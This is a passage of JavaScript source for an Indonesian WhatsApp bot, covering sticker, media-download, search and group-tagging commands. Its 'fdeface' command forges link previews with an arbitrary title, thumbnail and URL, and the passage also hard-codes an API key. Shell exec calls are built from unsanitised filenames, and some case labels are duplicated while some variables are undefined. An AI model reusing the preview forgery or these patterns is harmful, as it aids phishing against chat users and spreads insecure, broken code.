reply(`Pilih on atau off`)
}
break
///𝑃𝐼𝑅𝑇𝐸𝐾
      case "take":           
      case "colong":
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)      
if (isBanned) return reply(mess.ban)      
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: mek})
        if (!isQuotedSticker) return replyv("Stiker aja om");
        encmedia = JSON.parse(JSON.stringify(mek).replace("quotedM", "m"))
          .message.extendedTextMessage.contextInfo;
        media = await itsmevall.downloadAndSaveMediaMessage(encmedia);
        anu = args.join(" ").split("|");
        satu = anu[0] !== "" ? anu[0] : `SELF`;
        dua = typeof anu[1] !== "undefined" ? anu[1] : `Sticker By Bot-Alya`;
        require("./lib/fetcher.js").createExif(satu, dua);
        require("./lib/fetcher.js").modStick(media, itsmevall, mek, from);
        limitAdd(sender, limit)
        break;
      case "wm":       
      case "stikerwm":
      case "stickerwm":
      case "swm":
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)      
if (isBanned) return reply(mess.ban)      
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: mek})
        pe = args.join("");
        var a = pe.split("|")[0];
        var b = pe.split("|")[1];
        if ((isMedia && !mek.message.videoMessage) || isQuotedImage) {
          const encmedia = isQuotedImage
            ? JSON.parse(JSON.stringify(mek).replace("quotedM", "m")).message
                .extendedTextMessage.contextInfo
            : mek;
          media = await itsmevall.downloadAndSaveMediaMessage(encmedia);
          await createExif(a, b);
          out = getRandom(".webp");
          ffmpeg(media)
            .on("error", (e) => {
              console.log(e);
              itsmevall.sendMessage(from, "Terjadi kesalahan", "conversation", {
                quoted: mek,
              });
              fs.unlinkSync(media);
            })
            .on("end", () => {
              _out = getRandom(".webp");
              spawn("webpmux", [
                "-set",
                "exif",
                "./media/data.exif",
                out,
                "-o",
                _out,
              ]).on("exit", () => {
                itsmevall.sendMessage(
                  from,
                  fs.readFileSync(_out),
                  "stickerMessage",
                  { quoted: mek }
                );
                fs.unlinkSync(out);
                fs.unlinkSync(_out);
                fs.unlinkSync(media);
              });
            })
            .addOutputOptions([
              `-vcodec`,
              `libwebp`,
              `-vf`,
              `scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`,
            ])
            .toFormat("webp")
            .save(out);
        } else if (
          ((isMedia && mek.message.videoMessage.seconds < 11) ||
            (isQuotedVideo &&
              mek.message.extendedTextMessage.contextInfo.quotedMessage
                .videoMessage.seconds < 11)) &&
          args.length == 0
        ) {
          const encmedia = isQuotedVideo
            ? JSON.parse(JSON.stringify(mek).replace("quotedM", "m")).message
                .extendedTextMessage.contextInfo
            : mek;
          const media = await itsmevall.downloadAndSaveMediaMessage(encmedia);
          pe = args.join("");
          var a = pe.split("|")[0];
          var b = pe.split("|")[1];
          await createExif(a, b);
          out = getRandom(".webp");
          ffmpeg(media)
            .on("error", (e) => {
              console.log(e);
              itsmevall.sendMessage(from, "Terjadi kesalahan", "conversation", {
                quoted: mek,
              });
              fs.unlinkSync(media);
            })
            .on("end", () => {
              _out = getRandom(".webp");
              spawn("webpmux", [
                "-set",
                "exif",
                "./media/data.exif",
                out,
                "-o",
                _out,
              ]).on("exit", () => {
                itsmevall.sendMessage(
                  from,
                  fs.readFileSync(_out),
                  "stickerMessage",
                  { quoted: mek }
                );
                fs.unlinkSync(out);
                fs.unlinkSync(_out);
                fs.unlinkSync(media);
              });
            })
            .addOutputOptions([
              `-vcodec`,
              `libwebp`,
              `-vf`,
              `scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`,
            ])
            .toFormat("webp")
            .save(out);
        } else {
          reply(
            `Kirim gambar dengan caption ${prefix}swm teks|teks atau tag gambar yang sudah dikirim`
          );
        }
        limitAdd(sender, limit)
        break;

      case "fdeface":
      if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
      if (isBanned) return reply(mess.ban)
        ge = args.join("");
        var pe = ge.split("|")[0];
        var pen = ge.split("|")[1];
        var pn = ge.split("|")[2];
        var be = ge.split("|")[3];
        const fde = `kirim/reply image dengan capion ${prefix}fdeface link|title|desc|teks`;
        if (args.length < 1) return reply(fde);
        const dipes =
          isQuotedSticker || isQuotedImage
            ? JSON.parse(JSON.stringify(mek).replace("quotedM", "m")).message
                .extendedTextMessage.contextInfo
            : mek;
        const tipes = await itsmevall.downloadAndSaveMediaMessage(dipes);
        const bufer = fs.readFileSync(tipes);
        const desc = `${pn}`;
        const title = `${pen}`;
        const url = `${pe}`;
        const buu = `https://${be}`;
        var anu = {
          detectLinks: false,
        };
        var mat = await itsmevall.generateLinkPreview(url);
        mat.title = title;
        mat.description = desc;
        mat.jpegThumbnail = bufer;
        mat.canonicalUrl = buu;
        itsmevall.sendMessage(from, mat, MessageType.extendedText, anu);
        limitAdd(sender, limit)
        break;
       case 'antibug':
          if (!mek.key.fromMe) return reply("Khusus Owner 🗿");
          if (args[0] === 'on') {
          if (bugc === true) return reply(mess.anjawaUdhOn(command))
          bugc = true
          antitrol = true
          reply(mess.anjawaOn(command))
          } else if (args[0] === 'off') {
          if (bugc === false) return
          bugc = false
          antitrol = false
          reply(mess.anjawaOff(command))
          } else if (!q) {
          sendButMessage(from, `MODE ANTIBUG`, `Choose one`, [
            {
              buttonId: 'antibug on',
              buttonText: {
                displayText: `On`,
              },
              type: 1,
            },
            {
              buttonId: 'antibug off',
              buttonText: {
                displayText: `Off`,
              },
              type: 1,
            },
          ]);
        }
        break; 
      case "public":
        if (!isOwner && !mek.key.fromMe) return  reply('Perintah ini hanya untuk moderator')
        if (banChats === false) return;
        // var taged = mek.message.extendedTextMessage.contextInfo.mentionedJid[0]
        banChats = false;
        reply(`「 *PUBLIC-MODE* 」`);
        break;
      case "self":
        if (!isOwner && !mek.key.fromMe) return  reply('Perintah ini hanya untuk moderator')
        if (banChats === true) return;
        uptime = process.uptime();
        // var taged = mek.message.extendedTextMessage.contextInfo.mentionedJid[0]
        banChats = true;
        reply(`「 *SELF-MODE* 」`);
        break;
      case "hidetag":
        if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
        if (!isPremium && !isOwner && !mek.key.fromMe) return reply(mess.prem)
        if (!isGroupAdmins && !mek.key.fromMe) return reply("Perintah Ini hanya bisa di gunakan oleh Admin Grup");
        if (!isGroup) return reply(mess.only.group);
        var value = args.join(" ");
        var group = await itsmevall.groupMetadata(from);
        var member = group["participants"];
        var mem = [];
        member.map(async (adm) => {
          mem.push(adm.id.replace("c.us", "s.whatsapp.net"));
        });
        var optionshidetag = {
          text: value,
          contextInfo: { mentionedJid: mem },
          quoted: mek,
        };
        itsmevall.sendMessage(from, optionshidetag, text);
        limitAdd(sender, limit)
        break;
//Batas Kontol
case 'cocofun':   
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (isBanned) return reply(mess.ban)
			    if(!q)return reply(`Example : ${prefix + command} http://i.coco.fun/short/1513tui`)
                if (!q.includes('i.coco.fun')) return reply('Itu bukan link cocofun tot')
                await reply(mess.wait)
				anu = await fetchJson(`https://api.lolhuman.xyz/api/cocofun?apikey=${lolkey}&url=${q}`)				
				infomp3 = `*----「 COCOFUN DOWNLOAD 」----*
				
*Judul* : Cocofun Downloader
*Views* : ${anu.result.views}
*Diupload* : ${anu.result.uploader}
*Like* : ${anu.result.likes}
*Dirasi* : ${anu.result.duration}
				
*[Wait] Tunggu Sebentar..*`

                kontol = await getBuffer(anu.result.thumbnail);                		
				buffer1 = await getBuffer(anu.result.withwm)				
				itsmevall.sendMessage(from, buffer1, video, {mimetype: 'video/mp4', filename: `${anu.result.tag}.mp4`, quoted:mek, caption: 'Nih Gan'})
				sendButLocation(from, `${infomp3}`,`© REALZIBOT`, {jpegThumbnail:kontol}, [{buttonId:`${prefix}menu`,buttonText:{displayText:'MENU'},type:1}], {contextInfo: { mentionedJid: [sender, owner]}})
				limitAdd(sender, limit)         
					break		
case 'soundcloud':
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (isBanned) return reply(mess.ban)
                if(!q)return reply(`Example : ${prefix + command} link SoundCloud`)
                if (!q.includes('soundcloud.com')) return reply('Itu bukan link SoundCloud')
                await reply(mess.wait)
				xa.SoundCloud(`${q}`).then(async (data) => {
                    let txt = `*----「 SOUNDCLOUD DOWNLOAD 」----*\n\n`
                    txt += `*• Title :* ${data.title}\n`
                    txt += `*• Duration :* ${data.duration}\n`
					txt += `*• Quality :* ${data.medias[1].quality}\n`
					txt += `*• Ext :* ${data.medias[0].extension}\n`
                    txt += `*• Size :* ${data.medias[0].formattedSize}\n`
                    txt += `*• Url  :* ${data.url}\n\n`
                    txt += `*Mohon tunggu sebentar, sedang proses pengiriman...*`
                    loli = await getBuffer(data.thumbnail);                    
                    sendButLocation(from, `${txt}`,`© REALZIBOT`, {jpegThumbnail:loli}, [{buttonId:`${prefix}menu`,buttonText:{displayText:'MENU'},type:1}], {contextInfo: { mentionedJid: [sender, owner]}})                    
                    itsmevall.sendMessage(from , await getBuffer(data.medias[0].url), audio,{ quoted: mek, mimetype: 'audio/mp4' })
				})
				limitAdd(sender, limit)
			break
case 'ytmp3':                
case 'playmp3':
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (isBanned) return reply(mess.ban)
                  if (args.length === 0) return reply(`Kirim perintah *${prefix}ytmp3* _Url YouTube_`)
			if(!isUrl(args[0]) && !args[0].includes('youtube.com')) return reply('Link tidak valid!')
			var mulaikah = args.join(' ')
			reply(mess.wait)
                xa.Youtube(mulaikah).then(async (data) => {
                    let txt = `*----「 YOUTUBE MP3 」----*\n\n`
                    txt += `*• Quality :* ${data.medias[7].quality}\n`
                    txt += `*• Type :* ${data.medias[7].extension}\n`
                    txt += `*• Size :* ${data.medias[7].formattedSize}\n`
                    txt += `*• Url Source :* ${data.url}\n\n`
                    txt += `*Mohon tunggu sebentar kak, sedang proses pengiriman...*`
                    kontol = await getBuffer(data.thumbnail);
                    sendFileFromUrl(from, data.medias[7].url, '', mek)
                    sendButLocation(from, `${txt}`,`© REALZIBOT`, {jpegThumbnail:kontol}, [{buttonId:`${prefix}ytmp4 ${data.url}`,buttonText:{displayText:'MP4'},type:1}], {contextInfo: { mentionedJid: [sender, owner]}})
                    })
                .catch((err) => {
                    reply(`Server Erorr`)
                })
                limitAdd(sender, limit)
                break
case 'ytmp4':                
case 'playmp4':
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (isBanned) return reply(mess.ban)
if (!isPremium && !isOwner && !mek.key.fromMe) return reply(mess.prem)
			if (args.length === 0) return reply(`Kirim perintah *${prefix}ytmp3* _Url YouTube_`)
			if(!isUrl(args[0]) && !args[0].includes('youtube.com')) return reply('Link tidak valid!')
			var mulaikah = args.join(' ')
			reply(mess.wait)
			xa.Youtube(mulaikah).then(async (data) => {
                    let txt = `*----「 YOUTUBE VIDEO 」----*\n\n`
                    txt += `*• Quality :* ${data.medias[1].quality}\n`
                    txt += `*• Type :* ${data.medias[1].extension}\n`
                    txt += `*• Size :* ${data.medias[1].formattedSize}\n`
                    txt += `*• Url Source :* ${data.url}\n\n`
                    txt += `*Mohon tunggu sebentar kak, sedang proses pengiriman...*`
                    jembot = await getBuffer(data.thumbnail);
                    sendFileFromUrl(from, data.medias[1].url, '', mek)
                    sendButLocation(from, `${txt}`,`© REALZIBOT`, {jpegThumbnail:jembot}, [{buttonId:`${prefix}menu`,buttonText:{displayText:'MENU'},type:1}], {contextInfo: { mentionedJid: [sender, owner]}})
                    }).catch((err) => {
                    reply(`*Gagal Saat mendownload media dan mengirm video*`)
                })
                limitAdd(sender, limit)
             break
             case 'webtonsearch': case 'webtoon':
                if (!q) return reply('Masukan Judul Wibu nya tot')
                if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (isBanned) return reply(mess.ban)
                reply(mess.wait)
                xa.Webtoons(q).then(async data => {
                    let txt = `*------「 WEBTOONS-SEARCH 」------*\n\n`
                    for (let i of data) {
                        txt += `*📫 Title :* ${i.judul}\n`
                        txt += `*👍🏻 Like :* ${i.like}\n`
                        txt += `*🤴🏻 Creator :* ${i.creator}\n`
                        txt += `*🎥 Genre :* ${i.genre}\n`
                        txt += `*📚 Url :* ${i.url}\n ----------------------------------------------------------\n`
                    }
                    reply(txt)
                })
                .catch((err) => {
                    reply('Serverr Erorr')
                })
                limitAdd(sender, limit)
            break
            case 'drakor':
            if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (isBanned) return reply(mess.ban)
                if (!q) return reply('Masukan Judul drama nya')
                reply(mess.wait)
                xa.Drakor(q).then(async data => {
                    let txt = `*-----「 DRAKOR-SEARCH 」-----*\n\n`
                    for (let i of data) {
                        txt += `*📫 Title :* ${i.judul}\n`
                        txt += `*📆 Years :* ${i.years}\n`
                        txt += `*🎥 Genre :* ${i.genre}\n`
                        txt += `*📚 Url :* ${i.url}\n-----------------------------------------------------\n`
                    }
                    sendFileFromUrl(from,data[0].thumbnail,txt,mek)
                })
                .catch((err) => {
                    reply('Serveer Erorr')
                })
                limitAdd(sender, limit)
            break
            case 'animesearch':
            if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (isBanned) return reply(mess.ban)
                if (!q) return reply('Masukan Judul query Anime nya')
                reply(mess.wait)
                xa.Anime(q).then(async data => {
                    let txt = `*-------「 ANIME-SEARCH 」-------*\n\n`
                    for (let i of data) {
                        txt += `*📫 Title :* ${i.judul}\n`
                        txt += `*📚 Url :* ${i.link}\n-----------------------------------------------------\n`
                    }
                    sendFileFromUrl(from,data[0].thumbnail,txt,mek)
                })
                .catch((err) => {
                    reply('Serverr Erorr')
                })
                limitAdd(sender, limit)
            break
            case 'character': case 'karakter':
            if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (isBanned) return reply(mess.ban)
                if (!q) return reply('Masukan Judul Karakter')
                reply(mess.wait)
                xa.Character(q).then(async data => {
                    let txt = `*---「 CHARACTER-SEARCH 」---*\n\n`
                    for (let i of data) {
                        txt += `*📫 Character :* ${i.character}\n`
                        txt += `*📚 Url :* ${i.link}\n-----------------------------------------------------\n`
                    }
                    sendFileFromUrl(from,data[0].thumbnail,txt,mek)
                })
                .catch((err) => {
                    reply('Server Erorr')
                })
                limitAdd(sender, limit)
            break            
            case 'film':
            if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (isBanned) return reply(mess.ban)
                if (!q) return reply('Masukan Judul Flm yang mau di cari')
                reply(mess.wait)
                xa.Film(q).then(async data => {
                    let txt = `*--------「 FILM-SEARCH 」--------*\n\n`
                    for (let i of data) {
                        txt += `*📫 Title :* ${i.judul}\n`
                        txt += `*🎞️ Type :* ${i.type}\n`
                        txt += `*📟 Quality :* ${i.quality}\n`
                        txt += `*📮Upload :* ${i.upload}\n`
                        txt += `*📚 Url :* ${i.link}\n-----------------------------------------------------\n`
                    }
                    botwa = await getBuffer(data[0].thumb);
                    sendButLocation(from, `${txt}`,`© REALZIBOT`, {jpegThumbnail:botwa}, [{buttonId:`${prefix}menu`,buttonText:{displayText:'MENU'},type:1}], {contextInfo: { mentionedJid: [sender, owner]}})
                })
                .catch((err) => {
                    reply(`Serverr Erorr`)
                })
                limitAdd(sender, limit)
            break
            case 'play':
                  if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                  if (isBanned) return reply(mess.ban)
				  if (args.length < 1) return reply('*Masukan judul nya?*')
                reply(mess.wait)
				query = args.join(" ")
				anu = await fetchJson(`https://api.zacros.my.id/downloader/play?query=${query}`)
				if (Number(anu.medias[7].formattedSize) >= 10000) return reply(`Untuk Durasi lebih dari batas donload disini ${anu.url}`)		
				infomp3 = `*---- 「 PLAY MUSIC 」----*
				
*Judul* : _${anu.title}_
*Durasi* : _${anu.duration}_
*Quality* : _148kbps_
*Extension* : _3gp_
*Size* : _5GB_
*Link* : _${anu.url}_
				
*[Wait] Tunggu Sebentar..*`
				///////buffer = await getBuffer(anu.result.thumbnail)
				buffer1 = await getBuffer(anu.thumbnail)
				sendButLocation(from, `${infomp3}`,`© REALZIBOT`, {jpegThumbnail:buffer1}, [{buttonId:`${prefix}ytmp3 ${anu.url}`,buttonText:{displayText:`Audio ( ${anu.medias[7].formattedSize} )`},type:1},{buttonId:`${prefix}ytmp4 ${anu.url}`,buttonText:{displayText:`Video ( ${anu.medias[1].formattedSize} )`},type:1}], {contextInfo: { mentionedJid: [sender, owner]}})
				limitAdd(sender, limit)
					break      
case 'play': case 'song':
            if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
            if (isBanned) return reply(mess.ban)
			if (args.length === 0) return reply(`Kirim perintah *${prefix}play* _Judul lagu_`)
			var srch = args.join(' ')
			aramas = await yts(srch);
			aramat = aramas.all 
			var mulaikah = aramat[0].url
			try {
				xa.Youtube(mulaikah).then(async (data) => {
					if (Number(data.medias[7].formattedSize) >= 100000) return sendMediaURL(from, thumb, `*PLAY MUSIC*\n\n*Title* : ${title}\n*Ext* : MP3\n*Filesize* : ${filesizeF}\n*Link* : ${a.data}\n\n_Untuk durasi lebih dari batas disajikan dalam bentuk link_`)
						const captions = `*---- 「 PLAY MUSIC 」----*
						
• Title : ${aramas.videos[0].title}
• ID : ${aramas.videos[0].videoId}
• Upload : ${aramas.videos[0].ago}
• Size : ${data.medias[7].formattedSize}
• Views: ${aramas.videos[0].views} 
• Duration : ${aramas.videos[0].timestamp}
• Url : ${aramas.videos[0].url}`
thumbyt = await getBuffer(aramas.videos[0].thumbnail)
sendButLocation(from, `${captions}`,`© REALZIBOT`, {jpegThumbnail:thumbyt}, [{buttonId:`${prefix}ytmp3 ${aramas.videos[0].url}`,buttonText:{displayText:`Audio ( ${data.medias[7].formattedSize} )`},type:1},{buttonId:`${prefix}ytmp4 ${aramas.videos[0].url}`,buttonText:{displayText:`Video ( ${data.medias[1].formattedSize} )`},type:1}], {contextInfo: { mentionedJid: [sender,owner]}})
						})
				} catch (err) {
					reply('Terjadi kesalahan')
					}
		        	limitAdd(sender, limit)
             break     
             case 'alyuua':
             if (args.length < 1) return reply(`Kirim perintah ${prefix}play judul lagu`)
             reply(mess.wait)
             let yut = await yts(srch)
             yta(yut.videos[0].url)             
             .then(async(res) => {
             const { thumb, title, filesizeF, filesize } = res
             const capti = `𝗬𝗢𝗨𝗧𝗨𝗕𝗘 𝗣𝗟𝗔𝗬🍁
		     
•💬 Judul : ${yut.all[0].title}
•🎥 ID Video : ${yut.all[0].videoId}
•⏰️ Diupload Pada : ${yut.all[0].ago}
•👁️️ Views : ${yut.all[0].views}
•▶️ Durasi : ${yut.all[0].timestamp}
•📍 Channel : ${yut.all[0].author.name}
•🔗 Link Channel : ${yut.all[0].author.url}`
             ya = await getBuffer(thumb)
             py =await dimas.prepareMessage(from, ya, image)
             gbutsan = [{buttonId: `${prefix}buttonmusic ${yut.all[0].url}`, buttonText: {displayText: '🎵AUDIO'}, type: 1},{buttonId: `${prefix}buttonvideo ${yut.all[0].url}`, buttonText: {displayText: '🎥VIDEO'}, type: 1}]
             gbuttonan = {
             imageMessage: py.message.imageMessage,
             contentText: capti,
             footerText: 'Silahkan Pilih Jenis File Dibawah Ini☕',
             buttons: gbutsan,
             headerType: 4
}
             await istmevall.sendMessage(from, gbuttonan, MessageType.buttonsMessage)})
             break   
case 'video':
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (isBanned) return reply(mess.ban)
if (!arg && !m.quoted) return reply('Masukan judul atau Reply Judul Lagunya')
                             if (arg) {
                            const playy = await axios.get(`https://cililitan2.herokuapp.com/api/ytsearch?q=${encodeURI(arg)}`)
                            const mulaikah = playy.data.result[0]
							const {title, thumbnail, link, id} = mulaikah
                                reply(mess.wait)
                                
			const captions = `*Data Berhasil Didapatkan!*\n\n*Title* : ${title}\n*Id* : ${id}\n*Link* : ${link}\n*Server y2mate:* id4\n\n_Silahkan pilih jenis file di bawah, get vedeo / audio_`
                                    gambar = await getBuffer(thumbnail)
gbutsan = [
  {buttonId: `playmp4 ${link}`, buttonText: {displayText: 'VIDEO'}, type: 'RESPONSE'},
  {buttonId: `playmp3 ${link}`, buttonText: {displayText: 'AUDIO'}, type: 'RESPONSE'}
]
tes = await itsmevall.prepareMessage('0@s.whatsapp.net', {jpegThumbnail: gambar}, location, {thumbnail: gambar})
 gbuttonan = {
locationMessage: tes.message.locationMessage,
    contentText: captions,
    footerText: '© REALZIBOT',
    buttons: gbutsan,
    headerType: 'LOCATION'
}
		itsmevall.sendMessage(from, gbuttonan, MessageType.buttonsMessage, {quoted: mek})
			} else if (!arg) {
                           const playy = await axios.get(`https://cililitan2.herokuapp.com/api/ytsearch?q=${m.quoted.text}`)
							console.log(playy)
                            const mulaikah = playy.data.result[0]
							console.log(mulaikah)
							const {title, thumbnail, link, id} = mulaikah
                                reply(mess.wait)
                                
			const captions = `*Data Berhasil Didapatkan!*\n\n*Title* : ${title}\n*Id* : ${id}\n*Link* : ${link}\n*Server y2mate:* id4\n\n_Silahkan pilih jenis file di bawah, get vedeo / audio_`
                                    gambar = await getBuffer(thumbnail)
gbutsan = [
  {buttonId: `playmp4 ${link}`, buttonText: {displayText: 'VIDEO'}, type: 'RESPONSE'},
  {buttonId: `playmp3 ${link}`, buttonText: {displayText: 'AUDIO'}, type: 'RESPONSE'}
]
tes = await itsmevall.prepareMessage('0@s.whatsapp.net', {jpegThumbnail: gambar}, location, {thumbnail: gambar})
 gbuttonan = {
locationMessage: tes.message.locationMessage,
    contentText: captions,
    footerText: '© REALZIBOT',
    buttons: gbutsan,
    headerType: 'LOCATION'
}
		itsmevall.sendMessage(from, gbuttonan, MessageType.buttonsMessage, {quoted: mek})
			} 
			limitAdd(sender, limit)
                            break
      case "sticker":
      case "stiker":
      case "sgif":
      case "s":
      if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
      if (isBanned) return reply(mess.ban)
        if (
          ((isMedia && !mek.message.videoMessage) || isQuotedImage) &&
          args.length == 0
        ) {
          const encmedia = isQuotedImage
            ? JSON.parse(JSON.stringify(mek).replace("quotedM", "m")).message
                .extendedTextMessage.contextInfo
            : mek;
          const media = await itsmevall.downloadAndSaveMediaMessage(encmedia);
          ran = "666.webp";
          await ffmpeg(`./${media}`)
            .input(media)
            .on("start", function (cmd) {
              console.log(`Started : ${cmd}`);
            })
            .on("error", function (err) {
              console.log(`Error : ${err}`);
              fs.unlinkSync(media);
              reply("error");
            })
            .on("end", function () {
              console.log("Finish");
              itsmevall.sendMessage(from, fs.readFileSync(ran), sticker, {
                quoted: foncevid,
              });
              fs.unlinkSync(media);
              fs.unlinkSync(ran);
            })
            .addOutputOptions([
              `-vcodec`,
              `libwebp`,
              `-vf`,
              `scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`,
            ])
            .toFormat("webp")
            .save(ran);
        } else if (
          ((isMedia && mek.message.videoMessage.seconds < 11) ||
            (isQuotedVideo &&
              mek.message.extendedTextMessage.contextInfo.quotedMessage
                .videoMessage.seconds < 11)) &&
          args.length == 0
        ) {
          const encmedia = isQuotedVideo
            ? JSON.parse(JSON.stringify(mek).replace("quotedM", "m")).message
                .extendedTextMessage.contextInfo
            : mek;
          const media = await itsmevall.downloadAndSaveMediaMessage(encmedia);
          ran = "999.webp";
          reply(mess.wait);
          await ffmpeg(`./${media}`)
            .inputFormat(media.split(".")[1])
            .on("start", function (cmd) {
              console.log(`Started : ${cmd}`);
            })
            .on("error", function (err) {
              console.log(`Error : ${err}`);
              fs.unlinkSync(media);
              tipe = media.endsWith(".mp4") ? "video" : "gif";
              reply(`Gagal, pada saat mengkonversi ${tipe} ke stiker`);
            })
            .on("end", function () {
              console.log("Finish");
              itsmevall.sendMessage(from, fs.readFileSync(ran), sticker, {
                quoted: foncevid,
              });
              fs.unlinkSync(media);
              fs.unlinkSync(ran);
            })
            .addOutputOptions([
              `-vcodec`,
              `libwebp`,
              `-vf`,
              `scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`,
            ])
            .toFormat("webp")
            .save(ran);
        } else {
          reply(
            `Kirim gambar dengan caption ${prefix}sticker\nDurasi Maximal Video 1-9 Detik`
          );
        }
        limitAdd(sender, limit)
        break;        
        case 'stickermeme': case 'memesticker': case 'memestick': case 'stickmeme': case 'stcmeme': case 'smeme':{
						if (args.length < 1) return reply(`Kirim perintah *${prefix + command}* Alphabot`)
									if (q.includes('|')) return reply(`Kirim perintah *${prefix + command}* wibu`)
									try {
										if (!isQuotedImage) return reply(`Reply Gambar!`)
										reply(mess.wait)
										var teks2 = args.join(' ')
										var enmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
										var mediia = await itsmevall.downloadMediaMessage(enmedia)
										var njay = await uploadImages(mediia)
										var resu = `https://api.memegen.link/images/custom/-/${teks2}.png?background=${njay}`
										sendStickerFromUrl(from,`${resu}`)	
										} catch (e) {
											reply(`Server erorr`)
											console.log(e)
										}
										}
									break                       
                 case "toimg":
                 if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
      if (isBanned) return reply(mess.ban)
        if (!isQuotedSticker) return reply("𝗥𝗲𝗽𝗹𝘆/𝘁𝗮𝗴 𝘀𝘁𝗶𝗰𝗸𝗲𝗿 !");
        reply(mess.wait);
        encmedia = JSON.parse(JSON.stringify(mek).replace("quotedM", "m"))
          .message.extendedTextMessage.contextInfo;
        media = await itsmevall.downloadAndSaveMediaMessage(encmedia);
        ran = getRandom(".png");
        exec(`ffmpeg -i ${media} ${ran}`, (err) => {
          fs.unlinkSync(media);
          if (err) return reply("Yah gagal, coba ulangi ^_^");
          buffer = fs.readFileSync(ran);
          fakethumb(buffer, `Ni Kak ${pushname}`);
          fs.unlinkSync(ran);
        });
        limitAdd(sender, limit)
        break;
        case 'trigger':
                    if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
					var imgbb = require('imgbb-uploader')
					if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
					ger = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek 
					reply(mess.wait)
					console.log(color(time, 'magenta'), color('Downloading sticker...'))
					owgi = await  itsmevall.downloadAndSaveMediaMessage(ger)
					anu = await imgbb("0ffc503f79f9b051b82e643eb3e3a746", owgi)
					teks = `${anu.display_url}`
					ranp = getRandom('.gif')
					rano = getRandom('.webp')
					anu1 = `https://some-random-api.ml/canvas/triggered?avatar=${teks}`
					exec(`wget ${anu1} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, (err) => {
					fs.unlinkSync(ranp)
					if (err) return reply(mess.error.stick)
					itsmevall.sendMessage(from, fs.readFileSync(rano), sticker, {quoted: mek})
					fs.unlinkSync(rano)
					})
					} else {
					reply('Gunakan foto!')
					}
					break
             case 'song':          
                var teks = `Kirim perintah *${prefix}play query --option*\n\nList Option :\n- --ptt _for send voice notes_\n- --doc _for send document_\n\nContoh :\n*${command} query --ptt*\n*${command} query* Untuk Option Default Mengirim Audio\n\nNote : Fitur ini menggunakan satu limit harian!`
                if (args.length === 1) return itsmevall.sendMessage(from, teks, text, {quoted: mek, contextInfo: {externalAdReply: { title: `Youtube Play Music`, body: `How to Use the Play Music Feature`, mediaType: 2, thumbnail: fs.readFileSync('./itsmevall.jpg'), sourceUrl: `https://wa.me/6289653381067?text=assalamualaikum+bang+`}}})
                addCountCmd('#play', sender, _cmd)
                try {
                 reply(mess.wait)
                   let yut = await yts(q.replace('--ptt', '').replace('--doc', ''))
                    var res = await yta(yut.videos[0].url)
                    const { dl_link, thumb, title, filesizeF, filesize } = res
